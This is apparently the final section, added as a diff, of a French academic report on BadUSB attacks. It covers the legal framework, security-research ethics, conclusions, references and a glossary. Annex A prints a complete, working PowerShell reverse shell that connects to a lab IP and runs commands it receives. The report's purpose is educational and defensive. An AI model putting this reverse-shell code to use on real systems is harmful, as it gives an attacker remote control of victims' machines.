+    Formation utilisateur       & Partiel          & Partiel          & Partiel          & Moyen   \\
+    \bottomrule
+  \end{tabularx}
+\end{table}
+
+%=============================================================
+\chapter{Aspects légaux et éthiques}
+\label{chap:legal}
+%=============================================================
+
+\section{Cadre juridique}
+
+\subsection{France -- Loi Godfrain et Code pénal}
+
+En France, les attaques informatiques sont encadrées principalement par :
+
+\begin{itemize}
+  \item \textbf{Article 323-1 du Code pénal} : accès frauduleux à un système de traitement automatisé de données -- jusqu'à \textbf{2~ans d'emprisonnement et 60\,000~€ d'amende} ;
+  \item \textbf{Article 323-2} : entrave au fonctionnement d'un système -- jusqu'à \textbf{5~ans et 150\,000~€} ;
+  \item \textbf{Article 323-3} : introduction frauduleuse de données -- jusqu'à \textbf{5~ans et 150\,000~€} ;
+  \item \textbf{Article 323-3-1} : détention de logiciels malveillants -- jusqu'à \textbf{2~ans et 60\,000~€}.
+\end{itemize}
+
+\begin{alertbox}[Rappel légal]
+La simple possession d'un périphérique BadUSB préconfigué avec un payload malveillant peut être constitutive d'une infraction pénale au sens de l'article 323-3-1 du Code pénal français, même en l'absence d'utilisation effective.
+\end{alertbox}
+
+\subsection{Union Européenne -- Directive NIS2}
+
+La directive \textbf{NIS2} (Network and Information Security 2, 2022/2555), transposée en droit national avant octobre 2024, renforce les obligations de sécurité pour les entités essentielles et importantes. Elle impose notamment des mesures de gestion des risques liés aux équipements physiques.
+
+\subsection{International}
+
+\begin{itemize}
+  \item \textbf{États-Unis} : Computer Fraud and Abuse Act (CFAA), 18 U.S.C. § 1030 ;
+  \item \textbf{Royaume-Uni} : Computer Misuse Act 1990 ;
+  \item \textbf{Convention de Budapest} : premier traité international sur la cybercriminalité.
+\end{itemize}
+
+\section{Éthique du chercheur en sécurité}
+
+\subsection{Responsible Disclosure}
+
+La communauté de la sécurité informatique a développé des normes éthiques pour la divulgation responsable des vulnérabilités :
+
+\begin{enumerate}
+  \item Notifier le fabricant ou l'éditeur logiciel avant toute publication publique.
+  \item Accorder un délai raisonnable pour corriger la vulnérabilité (généralement 90 jours, selon la norme Google Project Zero).
+  \item Publier les détails techniques de manière à permettre la correction sans fournir une «~arme~» clé en main.
+\end{enumerate}
+
+\subsection{Bug Bounty et cadre légal}
+
+De nombreuses organisations proposent des programmes de \textit{bug bounty} qui permettent aux chercheurs de signaler des vulnérabilités en échange d'une récompense financière, dans un cadre légal clairement défini. Des plateformes comme HackerOne, Bugcrowd ou YesWeHack encadrent ces échanges.
+
+\subsection{Cadre du test d'intrusion (pentest)}
+
+Tout test d'intrusion doit impérativement être encadré par :
+
+\begin{itemize}
+  \item Une \textbf{lettre d'autorisation} signée par le responsable légal du système cible ;
+  \item Un \textbf{périmètre clairement défini} (machines autorisées, horaires, techniques permises) ;
+  \item Une \textbf{convention de confidentialité} (NDA) ;
+  \item Un \textbf{rapport de restitution} remis exclusivement au commanditaire.
+\end{itemize}
+
+%=============================================================
+\chapter{Conclusion et perspectives}
+\label{chap:conclusion}
+%=============================================================
+
+\section{Synthèse des résultats}
+
+Ce rapport a démontré que les attaques BadUSB constituent une menace sérieuse et sous-estimée pour la sécurité des systèmes d'information. Leurs caractéristiques principales sont :
+
+\begin{itemize}
+  \item \textbf{Facilité de mise en \oe uvre} : des matériels accessibles à moins de 2~€ permettent de réaliser des attaques sophistiquées ;
+  \item \textbf{Discrétion} : aucun logiciel malveillant n'est déposé sur le disque dur, rendant la détection très difficile ;
+  \item \textbf{Rapidité} : une compromission complète peut être réalisée en moins de 10~secondes ;
+  \item \textbf{Universalité} : tous les systèmes d'exploitation (Windows, macOS, Linux) sont potentiellement vulnérables.
+\end{itemize}
+
+\section{Limites de l'étude}
+
+\begin{itemize}
+  \item Les tests ont été réalisés dans un environnement contrôlé et ne reflètent pas nécessairement toutes les configurations de sécurité rencontrées en production ;
+  \item Les techniques de détection comportementale présentées sont prototypes et nécessiteraient une validation à grande échelle ;
+  \item L'évolution rapide des outils (Rubber Ducky MK3, O.MG Cable) peut rendre certaines contre-mesures obsolètes rapidement.
+\end{itemize}
+
+\section{Perspectives}
+
+\subsection{Travaux futurs}
+
+\begin{enumerate}
+  \item \textbf{Analyse du firmware} de contrôleurs USB récents (USB4, Thunderbolt) pour évaluer leur résistance aux modifications ;
+  \item \textbf{Développement d'un IDS USB} basé sur l'apprentissage automatique pour détecter les patterns anormaux en temps réel ;
+  \item \textbf{Étude des attaques sans fil} : les clés USB intégrant une puce Wi-Fi (O.MG Cable) permettent un déclenchement à distance.
+\end{enumerate}
+
+\subsection{Vers un standard de sécurité USB}
+
+L'USB-IF travaille sur des spécifications d'authentification USB (USB Type-C Authentication) permettant à un hôte de vérifier cryptographiquement l'identité et la conformité d'un périphérique avant d'établir la connexion. Bien que prometteuse, cette technologie tarde à être déployée à grande échelle.
+
+\section{Conclusion générale}
+
+La menace BadUSB illustre parfaitement le principe fondamental selon lequel \textbf{la sécurité informatique est aussi forte que son maillon le plus faible}. Tant que les systèmes d'exploitation accorderont une confiance implicite aux périphériques USB HID, cette vulnérabilité persistera. La réponse doit être multidimensionnelle : technique (contrôle des périphériques, détection comportementale), organisationnelle (politique de sécurité, formation) et juridique (cadre légal adapté).
+
+Ce projet a permis d'acquérir une compréhension approfondie des mécanismes d'attaque BadUSB et de sensibiliser à l'importance de la sécurité physique dans une stratégie de cybersécurité globale.
+
+%=============================================================
+% Annexes
+%=============================================================
+\appendix
+
+\chapter{Annexe A -- Commande PowerShell du Reverse Shell (décodée)}
+
+\begin{lstlisting}[language=PowerShell, caption={Commande PowerShell reverse shell -- version décodée (usage laboratoire uniquement)}]
+# ATTENTION : usage strictement reserve aux environnements de test autorises
+$client = New-Object System.Net.Sockets.TCPClient('192.168.56.101', 4444)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535 | % { 0 }
+while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+    $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
+    $sendback = (iex $data 2>&1 | Out-String)
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+    $stream.Write($sendbyte, 0, $sendbyte.Length)
+    $stream.Flush()
+}
+$client.Close()
+\end{lstlisting}
+
+\chapter{Annexe B -- Ressources et références utiles}
+
+\begin{itemize}
+  \item \textbf{Hak5} : \url{https://hak5.org} -- Matériels et outils de pentest USB
+  \item \textbf{DuckyScript 3.0} : \url{https://docs.hak5.org/hak5-usb-rubber-ducky/duckyscript-tm-quick-reference}
+  \item \textbf{USBGuard} : \url{https://usbguard.github.io}
+  \item \textbf{SR Labs BadUSB} : \url{https://srlabs.de/bites/badusb/}
+  \item \textbf{ANSSI -- Recommandations sur la sécurité des périphériques USB} : \url{https://www.ssi.gouv.fr}
+  \item \textbf{NIST SP 800-114} : \textit{User's Guide to Telework and Bring Your Own Device (BYOD) Security}
+\end{itemize}
+
+\chapter{Annexe C -- Glossaire}
+
+\begin{description}
+  \item[BadUSB] Technique d'attaque consistant à reprogrammer le firmware d'un contrôleur USB pour lui faire émuler un périphérique malveillant.
+  \item[DFU] \textit{Device Firmware Update} -- mode de mise à jour du firmware d'un périphérique USB.
+  \item[DigiSpark] Microcontrôleur ATtiny85 bon marché permettant d'émuler un clavier USB via la bibliothèque DigiKeyboard.
+  \item[EDR] \textit{Endpoint Detection and Response} -- solution de sécurité avancée pour les postes de travail.
+  \item[Firmware] Micrologiciel embarqué dans un composant matériel, contrôlant son comportement de bas niveau.
+  \item[HID] \textit{Human Interface Device} -- classe USB regroupant les dispositifs d'entrée humaine (clavier, souris).
+  \item[Payload] Charge utile d'une attaque ; ensemble de commandes ou d'instructions malveillantes exécutées sur la cible.
+  \item[Rubber Ducky] Clé USB commercialisée par Hak5, spécialement conçue pour l'injection de frappes clavier.
+  \item[Reverse Shell] Connexion réseau initiée par la machine compromise vers la machine attaquante, permettant une prise de contrôle à distance.
+  \item[USB-IF] USB Implementers Forum -- organisme de standardisation du protocole USB.
+  \item[VID/PID] Vendor ID / Product ID -- identifiants uniques permettant au système d'exploitation d'identifier un périphérique USB.
+\end{description}
+
+%=============================================================
+% Bibliographie
+%=============================================================
+\printbibliography[heading=bibintoc, title={Références bibliographiques}]
+
+\end{document}
